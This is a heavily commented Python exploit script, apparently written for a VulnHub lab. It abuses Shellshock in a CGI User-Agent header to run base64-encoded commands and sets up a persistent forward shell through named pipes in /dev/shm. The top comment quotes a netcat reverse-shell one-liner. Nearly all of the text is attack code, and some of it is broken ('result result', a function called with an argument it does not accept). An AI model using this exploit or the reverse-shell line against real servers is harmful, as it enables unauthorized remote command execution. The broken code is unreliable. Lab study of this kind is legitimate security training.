
# this shell is based upon ---> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ip port >/tmp/f
#It's just creating a named pipe to accept commands and piping commands into the named pipe and then doing output to a nc socket

#Instead of netcat in this code we're just gonna we are gonna output to a actual file and read the file and write to another file 
#see netcat-shell-explain Notes for more detail

#Also if we do echo "cd /root/Docs/vulnhub/socar" >> /tmp/input
#echo pwd > /tmp/input
#cat /tmp/output ( we see  /root/Docs/vulnhub/socar ) [-> which means we actually made a dir change and it's saved]


#so the vuln is in User-Agent parameter it's a cgi and the vuln is shell-shock(mostly 9/10)

from IPython.core.debugger import Tracer; breakpoint = Tracer()
import requests
import time
from base64 import b64encode #dealing with bad chars that we have to url encode 
from random import randrange #random helps us to generate sessions so we don't step on ourself when we create multiple  shell on the same box 

import threading #when we do su - it's not gonna promt for password without this threading, means without threading we're only reading once 
#the issue is we run the command and we only check output once, so here we check output every single sec.
# so we create a thread that runs in  background and just checks it every single seconds
#In this code we're just writinng contents to a file and then reading aother file to get output back so the program's never giving us output we have to set something up in the background to constantly
#read that file and constantly display output so that what's threading does.


class AllTheReads(object):  #we're passing an object means when we call all the threads, we could say interval=4 which will change the variable interval
    def __init__(self, interval=1):
        self.interval = interval    #just getting defined within this class i.e gonna be no. of sec we call read
        thread = threading.Thread(target=self.run, args=()) #defining the threads
        thread.daemon = True #puts it in the background
        thread.start()  #this says when threads initializes start 

    def run(self):
        clearoutput = """echo '' > %s """ % (stdout) # we're geting  a bunch of history every time we run a command bcoz we're not clearing out the file each time.  
        readoutput = """ /bin/cat %s """ %(stdout)
        while True:
            output = RunCmd(readoutput)
            if output: #if output is not nothing  
                RunCmd(clearoutput)
                print(output)
            time.sleep(interval)

def RunCmd(cmd): #this func going to run cmd commands

    # if we have this encoded .encode('utf-8') we ca do b64encode then we can remove the encoding with .decode('utf-8') so it's just ascii text 
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')    # we have to decode it from utf when we pass to bash 
    #python3 makes(){ ;; }; echo "Content-Type: text/html us do everything in binary format [ if we remove .encode('utf-8') and .decode('utf-8') then error bytes-like object not string ]

    headers = {
        'User-Agent': '(){ ;; }; echo "Content-Type: text/html"; echo; export PATH=/home/devil/.local/bin:/usr/local/sbin:/usr/sbin:/bin; "%s" | base64 -d | sh ' % (cmd) 
    # all we are doing is echoing the base64 we send through the http req. decoding it and the sending over to sh to be executed.           
    }
    result = (print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip())
    result result

def writeCmd(): #this funcs writes to stdin  meaning display the output of RunCmd() command to our terminal. 
     #same as abv just few things changed.
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    headers = {
        'User-Agent': '(){ ;; }; echo "Content-Type: text/html"; echo; export PATH=/home/devil/.local/bin:/usr/local/sbin:/usr/sbin:/bin; "%s" | base64 -d > %s' % (cmd, stdin) 
        #if here if we do stdout then we run hostname then we get hostname as it is.
    }
    result = (print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip())
    result result

def ReadCmd():

    Getoutput = """ /bin/cat %s  """ % (stdout)
    output = RunCmd(Getoutput)
    return output

def SetupShell():

    NamedPipes = """ mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s """ % (stdin, stdin, stdout) #Heart of the exploit
    try:    #this mkfifo never finishes so always use try 
        RunCmd(NamedPipes)
    except:
        None
    return None
global stdin, stdout    #(we could also do SetupShell(stdin, stdout)) #these gonna be static variables
session = randrange(1000,9999)  #returns a randomly selected integer from a specified range of values
                                #we did this bcoz at the end of this bcoz i assume we gonna run the script multiple times and unexpected error happens when the file already exists, so picking random  one 
                                #no repeats

stdin = '/dev/shm/input.%s' % (session) #/dev/shm/input.6751 random num
stdout = '/dev/shm/output.%s' % (session)

SetupShell()

#infinite loop  to read stdout file
ReadiTheThings = AllTheReads()

while True:
    cmd = input("> ")
    writeCmd(cmd + "\n")

    #breakpoint() this sets the breakpoint and drops u into IPDB which is a interactive python debugger  which tells u where u at. So now u can do print(headers)
    #if u just do till here every single req is a new req. (we can't do pwd and cd.. to change dir)
    #print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip()
    
    time.sleep(1.1)


